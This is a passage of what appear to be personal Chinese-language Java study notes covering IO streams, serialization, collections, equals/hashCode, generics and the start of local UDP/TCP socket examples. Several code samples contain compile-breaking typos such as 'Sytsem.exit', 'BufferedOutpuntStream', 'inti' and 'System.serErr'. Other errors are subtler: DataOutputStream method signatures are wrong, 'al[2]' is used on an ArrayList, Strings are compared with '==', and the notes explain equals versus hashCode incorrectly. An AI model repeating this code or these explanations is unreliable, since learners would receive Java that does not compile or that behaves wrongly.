IOException\n```\n\n从输入流中读取一定数量的字节，并将其存储在缓冲区数组b中。以整数形式返回实际读取的字节数。\n\n如果b的长度为0，则不读取任何字节并返回0；如果因为流位于文件末尾而没有可用的字节，则返回值为-1。\n\n```java\n//例子\nbyte[] buf = new byte[1000];\nFileInputStream fis = new FileInputStream(\"D:\\\\Java\\\\errorlog.txt\");\nint len = fis.read(buf);//读取出来的数据存到buf数组,返回数据长度len\n```\n\n```java\npublic int read(byte[] b, int off, int len) throws IOException\n```\n\n从输入流中最多读取len个字节的数据并存入byte数组中，b表示读取的数据要存入的数组的名字，off表示第一个读出的数据要存入的位置，即下标，len表示最多能读取的字节数。\n\n```java\nvoid close() throws IOException\n```\n\n关闭此输入流并释放与该流关联的所有系统资源。\n\n```java\nlong skip(long n) throws IOException\n```\n\n跳过和丢弃此输入流中数据的n个字节。\n\n### OutPutStream\n\n```java\n//向输出流中写入一个字节数据，该字节数据为参数b的低8位\nvoid write(int b) throws IOException\n    \n//将一个字节类型的数组中的数据写入输出流\nvoid write(byte[] b) throws IOException\n    \n//将一个字节类型的数组中的从指定位置(off)开始的len个字节写入到输出流\nvoid write(byte[] b, int off, int len) throws IOException\n    \n//关闭流释放内存资源\nvoid close() throws IOException\n    \n//将输出流中缓冲的数据全部写出到目的地\nvoid flush() throws IOException\n```\n\n### Reader\n\n```java\n//读取一个字符并以整数形式返回\nint read() throws IOException\n    \n//读取一系列字符并存储到一个数组cbuf\nint read(char[] cbuf) throws IOException\n    \n//从offset位置开始，最多读取length个字符，并存储到数组cbuf\nint read(char[] cbuf, int offset, int length) throws IOException\n    \n//关闭流释放内存资源\nvoid close() throws IOException\n    \n//跳过n个字符不读，返回实际跳过的字节数\nlong skip(long n) throws IOException\n```\n\n### Writer\n\n```java\n//向输出流中写入一个字符数据，该字符数据为参数c的低16位\nvoid write(int c) throws IOException\n    \n//将一个字符类型的数组中的数据写入输出流\nvoid write(char[] cbuf) throws IOException\n    \n//将一个字符类型的数组中的从指定位置(off)开始的len个字符写入到输出流\nvoid write(char[] cbuf, int off, int len) throws IOException\n    \n//将一个字符串中的字符写入到输出流\nvoid write(String string) throws IOException\n    \n//将一个字符串从指定位置(off)开始的len个字符写入到输出流\nvoid write(String string, int off, int len) throws IOException\n\n//关闭流释放内存资源\nvoid close() throws IOException\n    \n//将输出流中缓冲的数据全部写出到目的地\nvoid flush() throws IOException\n```\n\n## 字节流和字符流的区别\n\n```java\nimport java.io.*;\npublic class TestFileReaderWriterCopy\n{//字符流，复制文本文件可以，但视频音频照片等字节数据复制会出错\n    public static void main(String[] args) throws Exception\n    {\n        FileReader fr = new FileReader(\"D:\\\\Java\\\\TestFileReaderWriterCopy.java\");\n        FileWriter fw = new FileWriter(\"D:\\\\v5le0n9.txt\");\n        int ch;\n        ch = fr.read();\n        while(-1 != ch)\n        {\n            fw.write(ch);\n            ch = fr.read();\n        }\n        fw.flush();//刷新\n        fr.close();\n        fw.close();\n    }\n}\n```\n\n```java\nimport java.io.*;\npublic class TestFileInputStreamOutputStreamCopy\n{//字节流，可复制文本文件和非文本文件\n    public static void main(String[] args) throws Exception\n    {\n        FileInputStream fis = new FileInputStream(\"D:\\\\Java\\\\TestFileReaderWriterCopy.java\");\n        FileOutputStream fos = new FileOutputStream(\"D:/v5le0n9.txt\");\n        int ch;\n        ch = fis.read();\n        while(-1 != ch)\n        {\n            fos.write(ch);\n            ch = fis.read();\n        }\n        fos.flush();//刷新\n        fis.close();\n        fos.close();\n    }\n}\n```\n\n例：\n\n```java\nAF ED CB FF 12 CE\n//字节流一个一个字节读(AF)\n//字符流两个字节读(AF ED)，把二进制数据转换为字符，返回整型，存在解码和编码的问题\n```\n\n## 缓冲流\n\n缓冲流就是带有缓冲区的输入输出流。缓冲流可以显著地减少对IO的访问次数，保护硬盘。\n\n缓冲流是处理流，必须依附于节点流。\n\nJ2SDK提供了四种缓冲流，其常用的构造方法为：\n\n```java\nBufferedReader(Reader in)\nBufferedReader(Reader in, int sz)//sz为自定义缓冲区大小\n\nBufferedWriter(Writer out)\nBufferedWriter(Wreiter out, int sz)\n\nBufferedInputStream(InputStream in)\nBufferedInputStream(InputStream in, int size)\n\nBufferedOutputStream(OutputStream out)\nBufferedOutputStream(OutputStream out, int size)\n```\n\n缓冲输入流支持其父类的mark和reset方法。\n\nBufferedReader提供了readLine方法用于读取一行字符串(以\\r或\\n分隔)。\n\nBufferedWriter提供了newLine用于写入一个行分隔符。\n\n对于输出的缓冲流，写出的数据会现在内存中缓存，使用flush方法将会是内存中的数据立刻写出。\n\n```java\nimport java.io.*;\npublic class TestBufferedInputStreamOutputStreamCopy\n{\n    public static void main(String[] args) throws Exception\n    {\n        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(\"D:\\\\Java\\\\TestFileReaderWriterCopy.java\"));\n        BufferedOutputStream bos = new BufferedOutpuntStream(new FileOutputStream(\"D:/v5le0n9.txt\"));\n        byte[] buf = new byte[1024];//每次缓存1024个字节\n        int len;\n        len = bis.read(buf);\n        while(-1 != len)\n        {\n            //bos.write(buf);//很可能错误，因为最后可能没有1024个字节\n            bos.write(buf, 0, len);\n            len = bis.read(buf);\n        }\n        bos.flush();\n        bis.close();\n        bos.close();\n    }\n}\n```\n\n```java\nimport java.io.*;\npublic class TestBufferedReaderWriterCopy\n{\n    public static void main(String[] args)\n    {\n        BufferedReader br = null;\n        BufferedWriter bw = null;\n        try\n        {\n            br = new BufferedReader(new FileReader(\"D:/Java/TestBufferedReaderWriterCopy.java\"));\n            bw = new BufferedWriter(new FileWriter(\"D:\\\\Java\\\\v5le0n9.heihei\"));\n            String str = null;\n            while(null != (str=br.readLine()))//一行行读\n            {\n                bw.write(str);\n                bw.newLine();//写入一个换行符，这行不能省\n            }\n            bw.flush();\n        }\n        catch(FileNotFoundException e)\n        {\n            e.printStackTrace();\n            Sytsem.exit(-1);\n        }\n        catch(IOException e)\n        {\n            e.printStackTrace();\n            Sytsem.exit(-1);\n        }\n        finally\n        {\n            try\n            {\n                bw.close();\n                br.close();\n            }\n            catch(IOException e)\n            {\n                e.printStackTrace();\n                Sytsem.exit(-1);\n            }\n        }\n    }\n}\n```\n\n## 数据流\n\n### DataInputStream\n\nDataInputStream能够以一种有与机器无关的方式，直接从底层字节输入流读取Java基本类型和String类型的数据，常用的方法包括：\n\n```java\npublic DataInputStream(InputStream in)\npublic final boolean readBoolean()\npublic final byte readByte()\npublic final char readChar()\npublic final double readDouble()\npublic final float readFloat()\npublic final int readInt()\npublic final long readLong()\npublic final short readShort()\npublic final String readUTF()\n```\n\nDataInputStream是包裹流(处理流)，必须依附于InputStream\n\n### DataOutputStream\n\nDataOutputStream能够以一种与机器无关的方式，直接将Java基本类型和String类型数据写出到其他的字节输出流。常见方法：\n\n```java\npublic DataOutputStream(OutputStream out)\npublic final boolean writeBoolean()\npublic final byte writeByte()\npublic final char writeChar()\npublic final double writeDouble()\npublic final float writeFloat()\npublic final int writeInt()\npublic final long writeLong()\npublic final short writeShort()\npublic final String writeUTF()\n```\n\nDataOutputStream是包裹流(处理流)，必须依附于OutputStream\n\n### 数据流实例\n\n编程实现将long类型数据写入byte数组，然后再从byte数组中把该数据读出来。\n\n```java\nimport java.io.*;\npublic class TestByteArrayOutputStream\n{\n    public static void main(String[] args) throws Exception\n    {\n        long n = 9876543210L;\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();//字节数组输出流，字节数组输出流自动生成一个字节数组\n        DataOutputStream dos = new DataOutputStream(baos);\n        dos.writeLong(n);//把长整型写入字节数组里面去\n        dos.flush();\n        byte[] buf = baos.toByteArray();//把自动生成的字节数组复制到toByteArray()里去，再赋给buf\n        ByteArrayInputStream bais = new ByteArrayInputStream(buf);//把数组buf作为形参生成一个字节数组输入流对象\n        DataInputStream dis = new DataInputStream(bais);\n        long l = dis.readLong();//把字节数组读出来，返回长整型\n        //dis.readLong(l);//错误，读出来不需要参数\n        System.out.println(\"l = \" + l);\n        dos.close();\n    }\n}\n```\n\n## 转换流\n\nOutputStreamWriter流是把OutputStream流转化成Writer流的流，InputStreamReader流是把InputStream流转化成Reader流的流。\n\nOutputStreamWriter和InputStreamWriter都是处理流。\n\n### 转换流实例\n\n如何将键盘输入的字符组成字符串直接赋给String对象。\n\n```java\nimport java.io.*;\npublic class TestString\n{\n    public static void main(String[] args) throws Exception\n    {\n        String str = null;\n        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));\n        str = br.readLine();//readLine不包含换行符\n        System.out.println(\"str = \" + str);\n    }\n}\n```\n\n## Print流\n\nPrint流只有输出，没有输入。\n\nPrintWriter输出字符，PrintStream输出字节。\n\n### PrintStream\n\nPrintStream在OutputStream基础之上提供了增强的功能，即可以方便地输出各种类型数据(而不仅限于byte型)的格式化表示形式。\n\nPrintStream重载了printf和println方法，用于各种不同类型数据的格式化输出，格式化输出是指将一个数据用其字符串格式输出。\n\n```java\nimport java.io.*;\npublic class TestPrintString\n{\n    public static void main(String[] args) throws Exception\n    {\n        DataOutputStream dos = new DataOutputStream(new FileOutputStream(\"D:/Java/1.txt\"));\n        dos.writeLong(12345);//实际写入文件的是00 00 00 00 00 00 30 39\n        dos.close();\n        System.out.printf(\"%#X\\n\", 12345);//0X3039\n        \n        PrintStream ps = new PrintStream(new FileOutputStream(\"D:/Java/2.txt\"));\n        ps.println(12345);//实际写入文件的是‘1’，‘2’，‘3’，‘4’，‘5’\n        ps.close();\n    }\n}\n```\n\n### PrintWriter\n\nPrintWriter提供了PrintStream的所有打印方法，其方法也从不抛出IOException\n\n与PrintStream的区别：①作为处理流使用时，PrintStream只能封装OutputStream类型的字节流，而PrintWriter既可以封装OutputStream还能够封装Writer；②PrintWriter中的println()方法具有更好的跨平台性。\n\n### 标准输入输出的重定向\n\n```java\ntry\n{\n    ...\n}\ncatch(Exception e)\n{\n    e.printStackTrace();//默认把错误信息输出到System.err所关联的设备中\n    ...\n}\n```\n\n```java\npublic class TestSys\n{\n    public static void main(String[] args) throws Exception\n    {\n        PrintStream ps = new PrintStream(\"D:/heihei.aaa\");\n        System.setOut(ps);//设置输出，原本输出是在终端，现在改变输出设备，输出到ps里去\n        System.out.println(\"哈哈\");//哈哈放到了heihei.aaa\n    }\n}\n```\n\n```java\npublic class TestSetSystemOut\n{\n    public static void main(String[] args)\n    {//包含异常的写法\n        PrintStream ps_out = null;\n        try\n        {\n            ps_out = new PrintStream(new FileOutputStream(\"D:/Java/hello\"));\n            System.setOut(ps_out);\n            System.out.println(12);\n            System.out.println(55.5);\n        }\n        catch(Exception e)\n        {\n            e.printStackTrace();\n        }\n        finally\n        {\n            try\n            {\n                ps_out.close();\n            }\n            catch(Exception e)\n            {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n#### 实例\n\n编程实现将键盘输入整型数据到A文件中，如果输入有误，则把出错信息输出到B文件中。\n\n```java\nimport java.io.*;\nimport java.util.*;\npublic class TestSetOutErr\n{\n    public static void main(String[] args)\n    {\n        PrintStream psOut = null;\n        PrintStream psError = null;\n        Scanner sc = null;\n        try\n        {\n            psOut = new PrintStream(\"D:/Out.txt\");\n            psError = new PrintStream(\"D/Error.txt\");\n            sc = new Scanner(System.in);\n            int num;\n            System.setOut(psOut);\n            System.serErr(psError);\n            while(true)\n            {\n                num = sc.nextInt();\n                System.out.println(num);\n            }\n        }\n        catch(Exception e)\n        {\n            System.err.println(\"出错的信息是：\");\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n## 对象的序列化(Object流)\n\nSerializable接口中没有任何方法，这种类型的接口被称为标记接口。如果一个类实现了Serializable接口，潜在含义就是告诉编译器这个类是允许被序列化的，如果程序中存在序列该对象的代码，编译器就会自动进行相应的处理以完成该对象的序列化，如果该对象没有实现Serializable接口，程序中却存在该对象被序列化的代码，编译器编译时就会报错。\n\n在Java中transient修饰的成员变量在对象序列化时不会被序列化。\n\n```java\nimport java.io.*;\npublic class TestObjectIO\n{\n    public static void main(String[] args)\n    {\n        ObjectOutputStream oos = null;\n        ObjectInputStream ois = null;\n        Student ss = new Student(\"zhangsan\", 1000, 88.8f);\n        Student ss2 = null;\n        try\n        {\n            FileOutputStream fos = new FileOutputStream(\"D:\\\\Java\\\\dudu\");\n            oos = new ObjectOutputStream(fos);\n            oos.writeObject(ss);\n            \n            ois = new ObjectInputStream(new FileInputStream(\"D:/Java/dudu\"));\n            ss2 = (Student)ois.readObject();//(Student)不能省\n            \n            System.out.println(\"ss2.sname = \" + ss2.sname);\n            System.out.println(\"ss2.sid = \" + ss2.sid);\n            System.out.println(\"ss2.sscore = \" + ss2.sscore);\n        }\n        catch(FileNotFoundException e)\n        {\n            System.out.println(\"文件没有找到！\");\n            System.exit(-1);\n        }\n        catch(Exception e)\n        {\n            e.printStackTrace();\n            System.exit(-1);\n        }\n        finally\n        {\n            try\n            {\n                oos.close();\n                ois.close();\n            }\n            catch(Exception e)\n            {\n                e.printStackTrace();\n            \tSystem.exit(-1);\n            }\n        }\n    }\n}\nclass Student implements Serializable//这个接口为空，用作标识\n{\n    public String sname = null;\n    public int sid = 0;\n    transient public float sscore = 0;//表示sscore成员不能被序列化\n    public Student(String name, int id, float score)\n    {\n        this.sname = name;\n        this.sid = id;\n        this.sscore = score;\n    }\n}\n/**\nss2.sname = zhangsan\nss2.sid = 1000\nss2.sscore = 0.0\n*/\n```\n\n# 容器\n\n```java\nimport java.util.*;\nclass A\n{\n    public String toString()\n    {\n        return \"Haha\";\n    }\n}\npublic class Test\n{\n    public static void main(String[] args)\n    {\n        ArrayList al = new ArrayList();//数组线性结构\n        al.add(12345);\n        al.add(\"张三\");\n        al.add(66.6);\n        al.add(new A());\n        System.out.println(al);//[12345, 张三, 66.6, Haha]\n        //println调用的是al里面的各个对象的toString方法\n        //12345是个值，但添加到ArrayList里面的值就转换成了对象\n        //System.out.println(al[2]);//不是数组，不能用下标\n        System.out.println(al.get(2));//66.6\n        \n        Object[] obArr = al.toArray();//把集合转化为数组\n        System.out.println(al[2]);//66.6\n    }\n}\n```\n\n## 为什么需要容器\n\n数组存在两个缺陷：\n\n- 数组长度难以扩充\n- 数组中元素类型必须相同\n\n容器可以弥补数组的这两个缺陷。\n\n## 容器与现实的对应关系\n\n集合(容器)就是将若干用途、性质相同或相近的“数据”组合而成的一个整体。\n\n数学上，集合类型可以归纳为三种\n\n- 集(Set)：Set集合不区分元素的顺序，不允许出现重复元素\n- 列表(List)：List集合区分元素顺序，且允许包含重复元素\n- 映射(Map)：映射中保存成对“键-值”(Key-Value)信息，映射中不能包含重复的键，每个键最多只能映射一个值\n\nJava设计了三个接口来对应数学上的三种集合类型，这三个接口名字分别为Set、List、Map。\n\n## Collection接口中的方法介绍\n\n```java\n//返回此collection中的元素数\nint size();\n\n//判断是否为空\nboolean isEmpty();\n\n//判断形参c所指向的集合中的所有元素是不是已经全部包含在了当前集合中\nboolean containesAll(Collection c);\n\n//返回能够遍历当前集合所有元素的迭代器\nIterator iterator();\n\n//返回一个包含此collection中所有元素的数组\nObject[] toArray();\n\n//把e添加到当前集合中\nboolean add(Object e);\n\n//把o移除\nboolean remove(Object o);\n\n//把c中所有的元素添加到当前集合中\nboolean addAll(Collection c);\n\n//把c中所有元素移除\nboolean removeAll(Collection c);\n\n//把当前容器中的所有元素清除\nvoid clear();\n\n//判断是否相等\nboolean equals(Object o);\n\n//返回哈希码\nint hashCode();\n```\n\n## Collection接口的子接口——List接口\n\nList接口是Collection的子接口，实现List接口的容器类中的元素是有顺序的，而且可以重复。\n\nList容器中的元素都对应一个整数型的序号记载其在容器中的位置，可以根据序号存取容器中的元素。\n\nJ2SDK所提供的List容器类有ArrayList, LinkList等。\n\n```java\n//获取下标为index的元素\nObject get(int index);\n\n//把index位置的元素设置成element元素\nObject set(int index, Object element);\n\n//在index位置添加element元素\nvoid add(int index, Object element);\n\n//删除下标为index的元素\nObject remove(int index);\n\n//获取o元素出现的第一个下标\nint indexOf(Object o);\n\n//获取o元素出现的最后一个下标\nint lastIndexOf(Object o);\n```\n\n### ArrayList与LinkedList的比较\n\nArrayList和LinkedList都实现了List接口中的方法，但两者内部实现不同。ArrayList底层采用数组完成，而LinkedList则是以一般的双向链表完成，其内每个对象除了数据本身外，还有两个引用，分别指向前一个元素和后一个元素。\n\n它们两个的性质与C语言的数组和链表的性质一样。\n\n## Collections类\n\nCollection接口的实现类，如ArrayList、LinkedList本身并没有提供排序、倒置、查找等方法，这些方法是由Collesctions类来实现的，该类有很多public static方法，可以直接对Collection接口的实现类进行操作。\n\n### Collections类常用方法\n\n```java\n//对List容器内的元素排序\nvoid sort(List);\n\n//对List容器内的对象进行随机排列\nvoid shuffle(List);\n\n//对List容器内的对象进行逆序排列\nvoid reverse(List);\n\n//用一个特定的对象重写整个List容器\nvoid fill(List, Object);\n\n//将src List容器内容拷贝到dest List容器\nvoid copy(List dest, List src);\n\n//对于顺序的List容器，采用折半查找的方法查找特定对象的下标\nint binarySearch(List, Object);\n```\n\n```java\nimport java.util.*;\npublic class TestCollections\n{\n    public static void main(String[] args)\n    {\n        List lt = new LinkedList();//利用多态\n        for(int i=0; i<7; i++)\n        {\n            lt.add(\"a\" + i);\n        }\n        System.out.println(lt);\n        \n        Collections.shuffle(lt);//乱序\n        System.out.println(lt);\n        \n        Collections.sort(lt);//排序\n        System.out.println(lt);\n        \n        Collections.reverse(lt);//倒置\n        System.out.println(\"倒置之后：\" + lt);\n        System.out.println(Collections.binarySearch(lt, \"a5\"));//-8，倒置之后找不到，因为binarySearch方法只针对升序排序\n        \n        Collections.sort(lt);\n        System.out.println(\"重新排序之后：\" + lt);\n        System.out.println(Collections.binarySearch(lt, \"a5\"));//5\n        \n        Collections.fill(lt, \"0\");\n        System.out.println(lt);\n    }\n}\n```\n\n## Comparable接口\n\n```java\nimport java.util.*;\nclass Student\n{\n    private int id;\n    private String name;\n    public Student(inti id, String name)\n    {\n        this.id = id;\n        this.name = name;\n    }\n    @Override\n    public String toString()\n    {\n        return id + \" \" + name;\n    }\n}\npublic class TestList\n{\n    public static void main(String[] args)\n    {\n        List L = new ArrayList();\n        L.add(new Student(1000, \"张三\"));\n        L.add(new Student(1001, \"李四\"));\n        L.add(new Student(1002, \"王五\"));\n        //Collections.sort(L);//错误，不知道对对象的哪个属性排序\n        System.out.println(L);\n    }\n}\n```\n\n```java\nimport java.util.*;\nclass Student implements Comparable\n{//使用comparable接口调用compareTo方法\n    private int id;\n    private String name;\n    public Student(int id, String name)\n    {\n        this.id = id;\n        this.name = name;\n    }\n    @Override\n    public String toString()\n    {\n        return id + \" \" + name;\n    }\n    @Override\n    public int compareTo(Object o)\n    {//Obejct o是父类，需转换为子类才能调用子类的属性\n        Student st = (Student)o;\n        if(this.id == st.id)\n            return 0;\n        else if(this.id > st.id)\n            return 1;\n        else\n            return -1;\n    }\n}\npublic class TestList_2\n{\n    public static void main(String[] args)\n    {\n        List L = new ArrayList();\n        L.add(new Student(1000, \"张三\"));\n        L.add(new Student(1001, \"李四\"));\n        L.add(new Student(1002, \"王五\"));\n        L.add(new Student(1002, \"王五\"));\n        Collections.sort(L);//sort自动调用compareTo方法\n        System.out.println(L);//此时输出两个王五，这是我们不希望的，List接口有顺序可重复，而Set接口无顺序不重复。如果不希望输出两个王五，则使用Set接口\n    }\n}\n```\n\n## Collection接口的子接口——Set接口\n\n因为Set和List都是继承自Collection接口，所以Set和List中有很多方法是一样的。\n\nList接口中有add, set, indexOf方法，但Set接口中却只有add方法，没有set, indexOf方法。因为Set是无序且不能重复的，不存在某元素具体位置这个概念。\n\n```java\nimport java.util.*;\nclass Student\n{\n    private int id;\n    private String name;\n    public Student(int id, String name)\n    {\n        this.id = id;\n        this.name = name;\n    }\n    @Override\n    public String toString()\n    {\n        return id + \" \" + name;\n    }\n    @Override\n    public boolean equals(Object ob)\n    {//id和name都相等返回true，即st.id和st.name相乘的哈希码与this.id和this.name相乘的哈希码一样则返回true\n        Student st = (Student)ob;\n        return this.id == st.id && this.name == st.name;\n    }\n    @Override\n    public int hashCode()\n    {//返回id和name相乘的哈希码\n        return id * this.name.hashCode();\n    }\n}\npublic class TestSet\n{\n    public static void main(String[] args)\n    {\n        Set S = new HashSet();//TreeSet不需要重写equals和hashCode方法，但需要Comparable接口，且在插入数据时自动排序\n        //使用hashSet实现不重复要重写equals和hashCode方法，二者缺一不可\n        S.add(new Student(1000, \"张三\"));\n        S.add(new Student(1001, \"李四\"));\n        S.add(new Student(1002, \"王五\"));\n        System.out.println(S);\n        \n       \tS.add(new Student(1002, \"王五\"));\n        S.add(new Student(1001, \"王五\"));\n        S.add(new Student(1004, \"王五\"));\n        System.out.println(S);\n    }\n}\n/**\n[1000 张三, 1001 李四, 1002 王五]\n[1000 张三, 1001 李四, 1001 王五, 1002 王五, 1004 王五]\n*/\n//这个程序只解决了[id,name]的唯一性，却没有解决id的唯一性\n```\n\n### equals和hashCode方法的使用\n\n```java\nclass A\n{\n    private int i;\n    public A(int i)\n    {\n        this.i = i;\n    }\n}\npublic class TesthashCode\n{\n    public static void main(String[] args)\n    {\n        A aa1 = new A(1);\n        A aa2 = new A(1);\n        System.out.println(aa1 == aa2);//flase\n        System.out.println(aa1.equals(aa2));//flase\n        System.out.println(aa1.hashCode() == aa2.hashCode());//flase\n        \n        Integer it1 = new Integer(1);\n        Integer it2 = new Integer(1);\n        System.out.println(it1 == it2);//flase\n        System.out.println(it1.equals(it2));//true\n        //equals显示true表示Integer已经重写了equals方法，Java所有自带的数据类型都重写了equals方法，下面的hashCode同理\n        System.out.println(it1.hashCode() == it2.hashCode());//true\n    }\n}\n```\n\n如果不重写equals和hashCode方法，equals比较aa1和aa2的对象的地址的十六进制是否相等，hashCode比较aa1和aa2的对象的地址的十进制是否相等。\n\n如何重写equals和hashCode方法？\n\n```java\nclass A\n{\n    private int i;\n    public A(int i)\n    {\n        this.i = i;\n    }\n    @Override\n    public boolean equals(Object ob)\n    {\n        A aa = (A)ob;\n        return this.i == aa.i;\n    }\n    @Override\n    public int hashCode()\n    {\n        return new Integer(i).hashCode();\n    }\n}\npublic class TesthashCode_2\n{\n    public static void main(String[] args)\n    {\n        A aa1 = new A(1);\n        A aa2 = new A(1);\n        System.out.println(aa1 == aa2);//false\n        System.out.println(aa1.equals(aa2));//true\n        System.out.println(aa1.hashCode() == aa2.hashCode());//true\n        \n        Integer it1 = new Integer(1);\n        Integer it2 = new Integer(1);\n        System.out.println(it1 == it2);//flase\n        System.out.println(it1.equals(it2));//true\n        System.out.println(it1.hashCode() == it2.hashCode());//true\n    }\n}\n```\n\n## Iterator接口\n\n常用方法：\n\n```java\n//判断当前游标的后面是否还存在元素，如果存在返回true\nboolean hasNext();\n\n//先返回当前游标右边的元素，然后游标后移一个位置\nObject next();\n\n//删除最近返回的元素，在调用remove之前，我们至少保证先调用一次next方法，而且调用next之后只能调用一次remove方法，remove方法不推荐使用\nvoid remove();\n```\n\n```java\nimport java.util.*;\npublic class TestIterator\n{\n    //可以遍历所有Collection接口的实现类\n    public static void showCollection(Collection c)\n    {\n        Iterator it = c.iterator();//it相当于指针，指向容器c的第一个元素\n        while(it.hasNext())//相当于遍历\n        {\n            System.out.println(it.next());\n        }\n    }\n    public static void main(String[] args)\n    {\n        ArrayList al = new ArrayList();\n        al.add(\"one\");\n        al.add(22);\n        al.add(new Point(1,1));\n        System.out.println(\"al容器的内容是：\");\n        showCollection(al);\n        \n        HashSet hs = new HashSet();\n        hs.add(\"one\");\n        hs.add(22);\n        hs.add(new Point(1,1));\n        System.out.println(\"hs容器的内容是：\");\n        showCollection(hs);\n    }\n}\nclass Point\n{\n    private int i, j;\n    public Point(int i, int j)\n    {\n        this.i = i;\n        this.j = j;\n    }\n    public String toString()\n    {\n        return \"[\" + i + \",\" + j + \"]\";\n    }\n}\n```\n\n```java\nimport java.util.*;\npublic class TestIterator_2\n{\n    public static void main(String[] args)\n    {\n        Collection c = new TreeSet();//TreeSet自动排序\n        c.add(\"123\");\n        c.add(\"456\");\n        c.add(\"234\");\n        c.add(\"111\");\n        c.add(\"678\");\n        Iterator i = c.iterator();\n        while(i.hasNext())\n        {\n            System.out.println(i.next());\n        }\n    }\n}\n/**\n111\n123\n234\n456\n678\n*/\n```\n\n## Map接口\n\njava.util.Map接口描述了映射结构，Map结构允许以键集、值集合或键-值映射关系集的形式查看某个映射的内容。\n\n主要方法：\n\n```java\nObject put(Object key, Object value);\nObject get(Object key);\n\n//把m容器中所有元素存入当前容器中\nvoid putAll(Map m);\nboolean isEmpty();\nvoid clear();\nint size();\nboolean containsKey(Object key);\nboolean containsValue(Object value);\nObject remove(Object key);\n```\n\n```java\nimport java.util.*;\npublic class TestHashMap\n{\n    public static void main(String[] args)\n    {\n        Map m = new HashMap();\n        m.put(\"one\", \"zhangsan\");//前面是Key,后面是Value\n        m.put(66.6, 70);\n        m.put(new A(), \"12\");\n        //System.out.println(m.get(\"12\"));//null,get方法不能对value使用，只能对key使用\n        System.out.println(m.get(66.6));//70\n        System.out.println(m);//{66.6=70, one=zhangsan, A@15db9742=12}\n        m.put(66.6, 80);\n        System.out.println(m);//{66.6=80, one=zhangsan, A@15db9742=12}\n    }\n}\nclass A\n{}\n```\n\nMap(映射)是一种把键对象和值对象进行映射的集合，它的每一个元素都包含一对键对象和值对象。\n\n向Map集合中加入元素时，必须提供一对键对象和值对象，从Map集合中检索元素时，只要给出键对象，就会返回对应的值对象。\n\n```java\nimport java.util.*;\nclass Student\n{\n    private int id;\n    private String name;\n    private int age;\n    public Student()\n    {}\n    public Student(int id, String name, int age)\n    {\n        this.id = id;\n        this.name = name;\n        this.age = age;\n    }\n    public int hashCode()\n    {\n        return this.name.hashCode() * id * age;\n    }\n    public boolean equals(Object o)\n    {\n        Student s = (Student)o;\n        return this.name.equals(s.name) && this.id == s.id && this.age == s.age;\n    }\n    public String toString()\n    {\n        return id + \" \" + name + \" \" + age;\n    }\n}\npublic class TestHashMap_2\n{\n    public static void main(String[] args)\n    {\n        HashMap hm = new HashMap();//需要重写equals和hashCode\n        hm.put(1001, new Student(1001, \"zhangsan\", 20));//自动封装,1001被认为是Integer的一个对象\n        hm.put(1003, new Student(1003, \"lisi\", 30));\n        hm.put(new Integer(1004), new Student(1004, \"wangwu\", 10));\n        hm.put(1002, new Student(1002, \"v5le0n9\", 20));\n        \n        //遍历所有元素\n        System.out.println(\"hm容器中所有的元素是：\");\n        Set s = hm.keySet();//获取当前容器键的集合\n        Iterator it = s.iterator();\n        while(it.hasNext())\n        {\n            Integer key = (Integer)it.next();//(Integer)不能省\n            System.out.println(hm.get(key));\n        }\n        \n        System.out.println(\"直接查找某一元素\");\n        System.out.println(hm.get(1003));\n        System.out.println(hm.get(1005));//找不到返回null\n    }\n}\n/**\nhm容器中所有的元素是：\n1001 zhangsan 20\n1002 v5le0n9 20\n1003 lisi 30\n1004 wangwu 10\n直接查找某一元素\n1003 lisi 30\nnull\n*/\n```\n\n## 泛型\n\n泛型是用来限制传入容器、接口中的数据类型。\n\n参考TestHashMap_2\n\n```java\nHashMap<Integer, Student> hm = new HashMap<Integer, Student>();//容器中的东西全都是对象，所以Integer不能改为int\n//因为1001，1002都是Integer自动封装的，所以是Integer类型,Set同理\nSet<Integer> s = hm.keySet();\n//这样写保证了程序的安全性\nIterator<Integer> it = s.iterator();\n//Iterator it是键的集合，所以也是Integer类型，此时\n//Integer key = (Integer)it.next();可以省略(Integer)\nInteger key = it.next();\n```\n\n```java\n/**\nComparable<T> 接口中有如下方法：\n\tint compareTo(T o)\n要想限制传入Comparable接口的数据类型，可以利用泛型来实现：\nclass Student implements Comparable<Student>\n{\n\t...\n\tpublic int compareTo(Student ob)//Student不能写成Object\n\t{}\n}\n*/\n```\n\n# 网络编程\n\n## UDP编程\n\n```java\nimport java.net.*;\nimport java.io.*;\npublic class TestUDPServer\n{\n    public static void main(String[] args) throws Exception\n    {\n        //定义码头\n        DatagramSocket ds = new DatagramSocket(5678);//表示该码头占用的是5678这个编号，即服务端的端口号为5678\n        \n        //定义可以用来接受数据的集装箱\n        byte buf[] = new byte[1024];\n        DatagramPacket dp = new DatagramPacket(buf, buf.length);\n        try\n        {\n            while(true)\n            {\n                //在码头上用集装箱接受对方发送过来的数据\n                ds.receive(dp);\n                \n                //从集装箱中取出对方发送过来的数据\n                ByteArrayInputStream bais = new ByteArrayInputStream(dp.getData());\n                DataInputStream dis = new DataInputStream(bais);\n                System.out.println(dis.readLong());\n            }\n        }\n        catch(Exception e)\n        {\n            e.printStackTrace();\n            ds.close();//关闭码头\n        }\n    }\n}\n```\n\n```java\nimport java.net.*;\nimport java.io.*;\npublic class TestUDPClient\n{\n    public static void main(String[] args) throws Exception\n    {\n        //定义码头ds\n        DatagramSocket ds = new DatagramSocket();\n        \n        //定义可以发送数据的集装箱dp,dp中保存着数据，是n的二进制代码\n        long n = 10000L;\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        DataOutputStream dos = new DataOutputStream(baos);\n        dos.writeLong(n);//把10000写到字节数组里去\n        byte[] buf = baos.toByteArray();\n        DatagramPacket dp = new DatagramPacket(buf, buf.length, new InetSocketAddress(\"127.0.0.1\", 5678));//把字节数组包装成一个集装箱,发送到本地5678端口\n        \n        //在码头上把集装箱中的数据发送给对方\n        ds.send(dp);\n\n        //关闭码头\n        ds.close();\n    }\n}\n```\n\n## TCP编程\n\n```java\nimport java.net.*;\nimport java.io.*;\npublic class TCPServer\n{\n    public static void main(String[] args) throws Exception\n    {\n        ServerSocket ss = new ServerSocket(6666);//6666是端口号\n        while(true)\n        {\n            Socket s = ss.accept();//等待客户端连接\n            System.out.println(\"一个连接已经建立！\");\n            DataInputStream dis = new DataInputStream(s.getInputStream());\n            System.out.println(dis.readUTF());\n            dis.close();\n   